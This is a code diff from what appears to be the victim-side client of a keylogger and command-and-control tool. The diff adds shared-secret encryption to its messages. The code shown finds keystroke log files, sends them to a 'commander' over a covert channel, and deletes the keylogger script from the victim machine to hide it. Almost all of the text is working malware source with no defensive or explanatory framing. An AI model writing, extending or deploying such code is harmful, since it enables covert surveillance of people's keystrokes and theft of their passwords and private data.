@@ -142,8 +142,8 @@ if __name__ == '__main__':
                         client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
 
 # c) Check if data is to send recorded keystroked file(s) to commander
-                if data.decode() == constants.TRANSFER_KEYLOG_FILE_MSG:
-                    print(constants.CLIENT_RESPONSE.format(data.decode()))
+                if decrypted_data == constants.TRANSFER_KEYLOG_FILE_MSG:
+                    print(constants.CLIENT_RESPONSE.format(decrypted_data))
                     print(constants.GET_KEYLOG_REQUEST_MSG)
                     print(constants.GET_KEYLOG_CHECK_MSG)
 
@@ -159,30 +159,31 @@ if __name__ == '__main__':
                     if txt_files:
                         # Send response and number of files to commander
                         print(constants.SEARCH_FILES_SUCCESSFUL_MSG.format(len(txt_files)))
-                        client_socket.send(constants.SEARCH_FILES_SUCCESSFUL_SEND.format(len(txt_files),
-                                                                                         len(txt_files)).encode())
+                        client_socket.send(encrypt_string(constants.SEARCH_FILES_SUCCESSFUL_SEND.format(len(txt_files),
+                                                                                                        len(txt_files)),
+                                                          shared_secret).encode())
 
                         # Receive Actual Commander Port
-                        cmdr_port = client_socket.recv(200).decode()
+                        cmdr_port = decrypt_string(client_socket.recv(200).decode(), shared_secret)
 
                         # Send file(s) in current directory
                         for file_name in txt_files:
                             # Send file name
-                            client_socket.send(file_name.encode())
+                            client_socket.send(encrypt_string(file_name, shared_secret).encode())
                             print(constants.TRANSFER_KEYLOG_FILE_INFO.format(file_name))
 
                             # Receive Covert Channel Config
-                            header, field = client_socket.recv(200).decode().split("/")
+                            header, field = decrypt_string(client_socket.recv(200).decode(), shared_secret).split("/")
 
                             transfer_keylog_file_covert(client_socket, client_address[0], int(cmdr_port),
-                                                        source_port, (header, field), file_name)
+                                                        source_port, (header, field), file_name, shared_secret)
 
                         # Delete keylogger.py from client/victim
                         delete_file(constants.KEYLOG_FILE_NAME)
                     else:
                         # If no .txt keylog files present
                         print(constants.SEARCH_FILES_ERROR_MSG)
-                        client_socket.send(constants.SEARCH_FILES_ERROR_SEND.encode())
+                        client_socket.send(encrypt_string(constants.SEARCH_FILES_ERROR_SEND, shared_secret).encode())
 
 # d) WATCH FILE
                 if data.decode() == constants.WATCH_FILE_SIGNAL:
